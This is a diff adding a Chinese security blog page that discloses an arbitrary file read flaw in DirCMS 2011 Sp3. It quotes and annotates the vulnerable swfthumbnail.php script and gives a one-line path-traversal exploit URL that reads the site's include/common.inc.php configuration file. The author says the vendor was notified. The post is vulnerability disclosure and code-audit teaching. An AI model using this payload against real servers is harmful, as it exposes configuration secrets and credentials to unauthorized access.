@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="&amp;emsp;&amp;emsp;感觉时间真的过得真的很快，电脑一开一关一天就没了。不能这样下去，所以我打算抽出点时间来写博客和学习，记录一下自己的成长。不管是程序员、还是安全工程师，读别人的代码无疑都是进步较快的方式，所以我觉得从今天起抽出时间来把站长网上的开源cms都看一遍，学习学习。  &amp;emsp;&amp;emsp;看到一套DirCms就把他下回来了，名字还蛮特别的(ps:小心我dir溢出你)。貌似黑帽子们">
+<meta name="keywords" content="0day">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DirCMS 任意文件读取0day">
+<meta property="og:url" content="http://secoff.net/archives/6.html">
+<meta property="og:site_name" content="Security Off">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;感觉时间真的过得真的很快，电脑一开一关一天就没了。不能这样下去，所以我打算抽出点时间来写博客和学习，记录一下自己的成长。不管是程序员、还是安全工程师，读别人的代码无疑都是进步较快的方式，所以我觉得从今天起抽出时间来把站长网上的开源cms都看一遍，学习学习。  &amp;emsp;&amp;emsp;看到一套DirCms就把他下回来了，名字还蛮特别的(ps:小心我dir溢出你)。貌似黑帽子们">
+<meta property="og:updated_time" content="2017-08-01T11:44:01.077Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DirCMS 任意文件读取0day">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp;感觉时间真的过得真的很快，电脑一开一关一天就没了。不能这样下去，所以我打算抽出点时间来写博客和学习，记录一下自己的成长。不管是程序员、还是安全工程师，读别人的代码无疑都是进步较快的方式，所以我觉得从今天起抽出时间来把站长网上的开源cms都看一遍，学习学习。  &amp;emsp;&amp;emsp;看到一套DirCms就把他下回来了，名字还蛮特别的(ps:小心我dir溢出你)。貌似黑帽子们">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    
+    <title>DirCMS 任意文件读取0day | Security Off</title>
+    
+
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post" style="padding:40px;">
+<div id="nav" class="pull-right">
+  <ul>
+     <li class="icon">
+        <a href="javascript:history.go(-1)" title="Back"><i class="fa fa-mail-reply fa-5x"></i></a>
+     </li>
+  </ul>
+</div>
+  <!--
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  -->
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/archives/13.html"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/6.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/6.html&text=DirCMS 任意文件读取0day"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/6.html&is_video=false&description=DirCMS 任意文件读取0day"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DirCMS 任意文件读取0day&body=Check out this article: http://secoff.net/archives/6.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/6.html&name=DirCMS 任意文件读取0day&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    
+    <div class="content index width mx-auto px2 my4" style="max-width:58rem">
+    
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        DirCMS 任意文件读取0day
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Security Off</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2012-08-07T10:44:12.000Z" itemprop="datePublished">2012-08-07</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/0day/">0day</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>&emsp;&emsp;感觉时间真的过得真的很快，电脑一开一关一天就没了。不能这样下去，所以我打算抽出点时间来写博客和学习，记录一下自己的成长。不管是程序员、还是安全工程师，读别人的代码无疑都是进步较快的方式，所以我觉得从今天起抽出时间来把站长网上的开源cms都看一遍，学习学习。</p>
+
+<p>&emsp;&emsp;看到一套DirCms就把他下回来了，名字还蛮特别的(ps:小心我dir溢出你)。貌似黑帽子们审计代码都是查找关键字和跟踪关键位置，自己定义好一个存在风险的函数和变量名列表。我又不是黑阔，所以我喜欢根据程序的架构一个一个文件慢慢看，随便学习下开发者的技巧。</p>
+
+<p>&emsp;&emsp;当我看到/api/upload/swfthumbnail.php这个文件的时候，彻底无语了，只有短短的几十行代码。如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="comment">// This script accepts an ID and looks in the user's session for stored thumbnail name.</span></div><div class="line">	<span class="comment">// It then streams the data to the browser from the file</span></div><div class="line"></div><div class="line">	<span class="comment">// Work around the Flash Player Cookie Bug</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"PHPSESSID"</span>]))&#123;<span class="comment">//这个判断不会影响程序向下执行，不用管他</span></div><div class="line">		session_id($_POST[<span class="string">"PHPSESSID"</span>]);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	session_start();</div><div class="line"></div><div class="line">	<span class="comment">//关键位置，我想说这个正则有啥用？ boss可以扣除这个程序员的资金了。</span></div><div class="line">	$image_id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?preg_replace(<span class="string">'/[^a-z0-9:\.\/\\\\-]/i'</span>,<span class="string">''</span>,$_GET[<span class="string">"id"</span>]):<span class="keyword">false</span>;</div><div class="line"></div><div class="line">	<span class="comment">//由于上面的正则问题，所以 $image_id 就算是恶意构造也是为真的</span></div><div class="line">	<span class="keyword">if</span>($image_id===<span class="keyword">false</span>)</div><div class="line">	&#123;</div><div class="line">		header(<span class="string">"HTTP/1.1 500 Internal Server Error"</span>);</div><div class="line">		<span class="keyword">echo</span><span class="string">"No ID"</span>;</div><div class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//只要id的值不以http:// 开头，而且文件存在就可以不进入里面了。</span></div><div class="line">	<span class="comment">//由于是读本地文件，当然不用http://开头，保证文件的存在可以用相对路径../../</span></div><div class="line">	<span class="keyword">if</span>(substr($image_id,<span class="number">0</span>,<span class="number">7</span>)!=<span class="string">'http://'</span>&amp;&amp;!file_exists(<span class="string">"../../upload/image/"</span>.$image_id))</div><div class="line">	&#123;</div><div class="line">		header(<span class="string">"HTTP/1.1 404 Not found"</span>);</div><div class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//上面都通过了，这个当然没问题</span></div><div class="line">	<span class="keyword">if</span>(substr($image_id,<span class="number">0</span>,<span class="number">7</span>)!=<span class="string">'http://'</span>)</div><div class="line">	&#123;</div><div class="line">		header(<span class="string">"Content-type: image/jpeg"</span>);</div><div class="line">		header(<span class="string">"Content-length: "</span>.filesize(<span class="string">"../../upload/image/"</span>.$image_id));</div><div class="line">		flush();</div><div class="line">		readfile(<span class="string">"../../upload/image/"</span>.$image_id);<span class="comment">//输出文件</span></div><div class="line"></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		header(<span class="string">'location:'</span>.$image_id);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">exit</span>(<span class="number">0</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>测试版本为最新版：DirCMS 2011 Sp3</p>
+<p><pre><br>Exp：view-source:/api/upload/swfthumbnail.php?id=../../include/common.inc.php<br></pre><br>已通知官方，请勿非法测试，产生后果与本人无关。</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/6.html"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/6.html&text=DirCMS 任意文件读取0day"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/6.html&is_video=false&description=DirCMS 任意文件读取0day"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DirCMS 任意文件读取0day&body=Check out this article: http://secoff.net/archives/6.html"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/6.html&title=DirCMS 任意文件读取0day"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/6.html&name=DirCMS 任意文件读取0day&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    
+<div class="content index width mx-auto px2 my4" style="max-width:58rem">
+<footer id="footer" style="max-width:58rem">
+
+  <div class="footer-left">
+    Copyright &copy; 2017 b4dboy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
